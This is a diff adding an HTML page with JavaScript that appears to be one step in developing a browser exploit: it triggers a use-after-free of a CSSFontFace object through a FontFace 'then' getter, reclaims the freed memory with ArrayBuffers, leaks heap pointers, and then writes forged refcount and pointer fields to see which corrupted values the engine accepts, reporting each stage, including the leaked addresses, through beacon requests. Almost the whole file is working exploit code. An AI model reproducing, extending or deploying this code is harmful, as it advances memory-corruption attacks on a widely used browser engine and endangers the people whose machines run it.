@@ -1,0 +1,177 @@
+<!--
+  p567: CSSFontFace field sensitivity scan
+
+  Extends p564's two-stage approach: stage 1 leaks p58/p68, then stages 2-5
+  each free a new CSSFontFace, refill the reclaimed chunk with a modified
+  template, and let the engine continue.  Survival = the field value is accepted.
+
+  Tests (in order of risk):
+    Stage 2: baseline {rc=1, p58, p68}         — control (p564 proved this)
+    Stage 3: {rc=1, p58, p68=p58}              — redirect p68 to same valid obj
+    Stage 4: {rc=1, p58, p68=0}                — null p68
+    Stage 5: {rc=2, p58, p68}                  — refcount bump
+
+  Chain stops at first crash.  Each surviving stage emits a beacon.
+  One useful result per guide restart (constraint from FONTFACE doc).
+
+  CRASH_CLASS: MODERATE — stages 3-5 may crash WebProcess
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p567 field sensitivity</title>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+m+'?t='+Date.now(),false);x.send(null);}catch(e){}}
+
+var K = 4, SIZE = 192, styleEl = null, firedHere = false;
+var stageNum = 0, leaked = {p58: null, p68: null};
+var testQueue = [];
+
+function hex8be(v, off) {
+  var s = '';
+  for (var i = 7; i >= 0; i--) s += ('0' + v[off + i].toString(16)).slice(-2);
+  return s;
+}
+
+function grab(v, off) {
+  var a = [];
+  for (var i = 0; i < 8; i++) a.push(v[off + i]);
+  return a;
+}
+
+function addr64(v, off) {
+  var lo = (v[off] | (v[off+1] << 8) | (v[off+2] << 16) | ((v[off+3] << 24) >>> 0)) >>> 0;
+  var hi = (v[off+4] | (v[off+5] << 8) | (v[off+6] << 16) | ((v[off+7] << 24) >>> 0)) >>> 0;
+  return hi * 0x100000000 + lo;
+}
+
+function writeLE8(v, off, bytes) {
+  for (var i = 0; i < 8; i++) v[off + i] = bytes[i];
+}
+
+function writeLE4(v, off, val) {
+  v[off]   =  val        & 0xFF;
+  v[off+1] = (val >>  8) & 0xFF;
+  v[off+2] = (val >> 16) & 0xFF;
+  v[off+3] = (val >> 24) & 0xFF;
+}
+
+function setupFace(idx) {
+  var name = 'f' + idx;
+  var css = "@font-face { font-family: s" + idx + "; src: local(Arial); unicode-range: U+004" + (2 + idx).toString(16) + "; }";
+  styleEl = document.createElement('style');
+  styleEl.textContent = css;
+  document.head.appendChild(styleEl);
+  var A = new FontFace(name, 'local(Helvetica)', { unicodeRange: 'U+0041' });
+  document.fonts.add(A);
+  void A.loaded;
+  window.__alive.push(A);
+}
+
+function installGetter(template) {
+  firedHere = false;
+  Object.defineProperty(FontFace.prototype, 'then', {
+    configurable: true,
+    get: function() {
+      if (firedHere) return undefined;
+      firedHere = true;
+      if (styleEl) {
+        styleEl.remove();
+        styleEl.textContent = '';
+      }
+      try { document.fonts.delete(this); } catch(e) {}
+      styleEl = null;
+      document.body.offsetHeight;
+
+      window.__map = [];
+      for (var k = 0; k < K; k++) {
+        var ab = new ArrayBuffer(SIZE);
+        var v = new Uint8Array(ab);
+        if (template) {
+          if (template.rc !== undefined) writeLE4(v, 0x00, template.rc);
+          if (template.p58) writeLE8(v, 0x58, template.p58);
+          if (template.p68) writeLE8(v, 0x68, template.p68);
+        }
+        window.__map.push(v);
+      }
+      try { document.fonts.check('1em s' + stageNum); } catch(e) {}
+      return undefined;
+    },
+    set: function() {}
+  });
+}
+
+function scanHit() {
+  var m = window.__map || [];
+  for (var i = 0; i < m.length; i++) {
+    if (m[i][0x58] !== 0 || m[i][0x59] !== 0 || m[i][0x5A] !== 0 || m[i][0x5B] !== 0) {
+      return { hit: i, v: m[i] };
+    }
+  }
+  return null;
+}
+
+function runStage1() {
+  stageNum = 0;
+  setupFace(0);
+  installGetter(null);
+  b('P567-SETUP');
+  document.fonts.load('1em f0, s0', 'AB').then(
+    function() { b('P567-S1-RESOLVED'); },
+    function() { b('P567-S1-REJECTED'); }
+  );
+  setTimeout(afterStage1, 150);
+}
+
+function afterStage1() {
+  var r = scanHit();
+  if (!r) { b('P567-S1-NOHIT'); return; }
+  leaked.p58 = grab(r.v, 0x58);
+  leaked.p68 = grab(r.v, 0x68);
+  var rc = r.v[0];
+
+  b('P567-S1-b' + r.hit
+    + '-p58_' + hex8be(r.v, 0x58)
+    + '-p68_' + hex8be(r.v, 0x68)
+    + '-rc_' + rc);
+
+  testQueue = [
+    { name: 'BASELINE',   rc: 1, p58: leaked.p58, p68: leaked.p68 },
+    { name: 'P68_EQ_P58', rc: 1, p58: leaked.p58, p68: leaked.p58 },
+    { name: 'P68_NULL',   rc: 1, p58: leaked.p58, p68: [0,0,0,0,0,0,0,0] },
+    { name: 'RC_BUMP',    rc: 2, p58: leaked.p58, p68: leaked.p68 }
+  ];
+
+  runNextTest();
+}
+
+function runNextTest() {
+  if (testQueue.length === 0) {
+    b('P567-ALL-DONE');
+    return;
+  }
+
+  var test = testQueue.shift();
+  stageNum++;
+  setupFace(stageNum);
+  installGetter(test);
+
+  b('P567-T' + stageNum + '-' + test.name);
+
+  document.fonts.load('1em f' + stageNum + ', s' + stageNum, 'AB').then(
+    function() {
+      b('P567-T' + stageNum + '-SURVIVED');
+      setTimeout(runNextTest, 100);
+    },
+    function() {
+      b('P567-T' + stageNum + '-REJECTED');
+      setTimeout(runNextTest, 100);
+    }
+  );
+}
+
+function start() {
+  window.__alive = [];
+  runStage1();
+}
+
+if (document.readyState === 'complete' || document.readyState === 'interactive') setTimeout(start, 0);
+else document.addEventListener('DOMContentLoaded', start);
+</script></head><body><p>p567 field sensitivity</p></body></html>
